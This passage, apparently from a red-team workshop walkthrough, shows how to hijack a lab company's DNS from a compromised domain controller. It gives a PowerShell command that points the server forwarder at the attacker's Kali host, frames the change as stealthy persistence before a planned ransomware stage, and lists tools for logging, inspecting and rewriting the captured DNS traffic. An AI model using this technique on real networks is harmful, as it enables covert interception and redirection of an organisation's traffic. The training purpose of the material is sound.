So all the DNS in both IT and OT are pointing to the IT DC. Let's configure a forwarder on that DC to make sure that we will have all the DNS traffic of the entire company.	
	
So even if they recover from our later attack, which will be ramsomware, they will not think about checking their DNS configuration.
	
Head over to the beacon on the IT domain controller and let's check their current DNS configuration.
	
```
powershell Get-DnsServerForwarder
```

![Get  DNS Server Forwarder](/images/DNS_Get_Before_Change.png)
	
Let's overwrite the configuration with our Kali machine so all DNS traffic will come to us. 
	
```
powershell Set-DnsServerForwarder -IPAddress 172.22.0.2
```

![Set DNS Server Forwarder](/images/DNS_Set_Change.png)

Check to be sure the change took into effect.
![Get  DNS Server Forwarder after change](/images/DNS_Get_After_Change.png)
	
Now all the DNS request are going via our Kali machine and we will have visibility over all traffic. We would also be able to manipulate this all, but for this workshop we're not going to do this.
	
<div class="info">
	
Now all the request are coming to our kali machine and we could misuse this in multiple ways like:
1. Logging = visibility
2. tcpdump = deep inspection
3. dnstop = live overview
4. Zones/RPZ = control

<br>
	
1. **Query logging (BIND)**

Logs every DNS request handled by your server (client IP, domain, record type).
* Use it for: simple visibility and auditing
* Strength: clean, readable logs
* Limitation: no deep packet details

2. **tcpdump**

Captures raw DNS traffic at the network level (queries and responses).
* Use it for: troubleshooting and low-level analysis
* Strength: full visibility of what's happening
* Limitation: harder to read, not structured


3. **dnstop**

Real-time DNS traffic monitor showing top domains and active clients.
* Use it for: quick overview of DNS activity
* Strength: easy, live statistics
* Limitation: no history, less detail


4. **Zones / RPZ**

Modify DNS responses (redirect, block, or fake domains).
* Use it for: controlling DNS behavior
* Strength: powerful filtering and manipulation
* Limitation: more complex to configure
